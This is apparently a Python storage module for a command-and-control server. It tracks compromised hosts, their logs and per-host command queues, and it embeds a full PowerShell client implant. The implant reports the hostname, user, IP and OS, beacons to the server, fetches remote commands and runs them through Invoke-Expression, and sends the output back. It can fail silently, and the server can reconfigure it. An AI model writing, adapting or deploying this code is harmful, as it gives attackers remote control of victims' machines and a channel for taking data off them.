"""
In-memory storage module for the C2 server.
Provides functionality for storing host data, logs, errors, commands, and configuration.
"""
import time
import threading

class Storage:
    def __init__(self):
        # Initialize storage dictionaries
        self.hosts = {}  # Stores connected host information
        self.logs = {}   # Stores logs from hosts
        self.errors = {} # Stores errors from hosts
        self.commands = {}  # Queue of commands for each host
        self.config = {
            "ngrok_host": "127.0.0.1", 
            "ngrok_port": 5000,
            "retry_interval": 60,
            "silent_mode": False,
            "persist": True
        }
        
        # Default PowerShell client script
        self.powershell_script = """
# Default PowerShell C2 Client Script
# This script connects to the C2 server and executes commands

$ngrokHost = "127.0.0.1"
$ngrokPort = 5000
$retryInterval = 60
$silentMode = $false
$persist = $true

function Get-HostInfo {
    $hostInfo = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress
        os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        time = [int](Get-Date -UFormat %s)
    }
    return $hostInfo
}

function Send-StatusReport {
    $hostInfo = Get-HostInfo
    $jsonData = $hostInfo | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/report/status" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send status report: $_"
        }
    }
}

function Send-Heartbeat {
    $heartbeat = @{
        hostname = $env:COMPUTERNAME
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $heartbeat | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/heartbeat" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send heartbeat: $_"
        }
    }
}

function Get-Command {
    try {
        $cmd = Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/command?hostname=$env:COMPUTERNAME" -Method Get
        if ($cmd -ne "") {
            return $cmd
        }
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to get command: $_"
        }
    }
    return $null
}

function Send-CommandOutput {
    param (
        [string]$command,
        [string]$output
    )
    
    $resultData = @{
        hostname = $env:COMPUTERNAME
        command = $command
        output = $output
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $resultData | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/report/output" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send command output: $_"
        }
    }
}

function Send-ErrorReport {
    param (
        [string]$errorMsg
    )
    
    $errorData = @{
        hostname = $env:COMPUTERNAME
        error = $errorMsg
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $errorData | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/error" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail
    }
}

function Update-Config {
    try {
        $configData = Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/config" -Method Get
        $ngrokHost = $configData.ngrok_host
        $ngrokPort = $configData.ngrok_port
        $retryInterval = $configData.retry_interval
        $silentMode = $configData.silent_mode
        $persist = $configData.persist
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to update config: $_"
        }
    }
}

# Main loop
Send-StatusReport

while ($true) {
    try {
        # Update configuration
        Update-Config
        
        # Send heartbeat
        Send-Heartbeat
        
        # Check for commands
        $command = Get-Command
        if ($command -ne $null) {
            try {
                # Execute command and capture output
                $output = Invoke-Expression -Command $command | Out-String
                Send-CommandOutput -command $command -output $output
            } catch {
                Send-ErrorReport -errorMsg "Error executing command: $_"
            }
        }
        
        # Sleep before next check
        Start-Sleep -Seconds $retryInterval
    } catch {
        Send-ErrorReport -errorMsg "Error in main loop: $_"
        Start-Sleep -Seconds $retryInterval
    }
}
"""
        # Thread lock for thread-safe operations
        self.lock = threading.Lock()

    def update_host(self, hostname, username, ip, os, timestamp):
        """Update host information in storage"""
        with self.lock:
            self.hosts[hostname] = {
                'username': username,
                'ip': ip,
                'os': os,
                'last_seen': timestamp,
                'first_seen': self.hosts.get(hostname, {}).get('first_seen', timestamp)
            }
        return True

    def update_heartbeat(self, hostname, timestamp):
        """Update the last_seen timestamp for a host"""
        with self.lock:
            if hostname in self.hosts:
                self.hosts[hostname]['last_seen'] = timestamp
                return True
            return False

    def add_log(self, hostname, log_data, timestamp):
        """Add a log entry for a host"""
        with self.lock:
            if hostname not in self.logs:
                self.logs[hostname] = []
            
            self.logs[hostname].append({
                'data': log_data,
                'timestamp': timestamp
            })
        return True

    def add_error(self, hostname, error, timestamp):
        """Add an error entry for a host"""
        with self.lock:
            if hostname not in self.errors:
                self.errors[hostname] = []
            
            self.errors[hostname].append({
                'error': error,
                'timestamp': timestamp
            })
        return True

    def add_command(self, hostname, command):
        """Add a command to the queue for a host"""
        with self.lock:
            if hostname not in self.commands:
                self.commands[hostname] = []
            
            self.commands[hostname].append(command)
        return True

    def get_next_command(self, hostname):
        """Get the next command for a host"""
        with self.lock:
            if hostname in self.commands and self.commands[hostname]:
                return self.commands[hostname].pop(0)
            return ""

    def add_command_output(self, hostname, command, output, timestamp):
        """Add the output of a command for a host"""
        with self.lock:
            if hostname not in self.logs:
                self.logs[hostname] = []
            
            self.logs[hostname].append({
                'command': command,
                'output': output,
                'timestamp': timestamp
            })
        return True

    def update_config(self, config_data):
        """Update the configuration"""
        with self.lock:
            for key, value in config_data.items():
                if key in self.config:
                    self.config[key] = value
        return True

    def get_config(self):
        """Get the current configuration"""
        with self.lock:
            return self.config.copy()

    def update_powershell_script(self, script_content):
        """Update the PowerShell script"""
        with self.lock:
            self.powershell_script = script_content
        return True

    def get_powershell_script(self):
        """Get the PowerShell script"""
        with self.lock:
            return self.powershell_script

    def get_all_hosts(self):
        """Get all host information"""
        with self.lock:
            return self.hosts.copy()

    def get_host_logs(self, hostname):
        """Get logs for a specific host"""
        with self.lock:
            return self.logs.get(hostname, []).copy()

    def get_host_errors(self, hostname):
        """Get errors for a specific host"""
        with self.lock:
            return self.errors.get(hostname, []).copy()
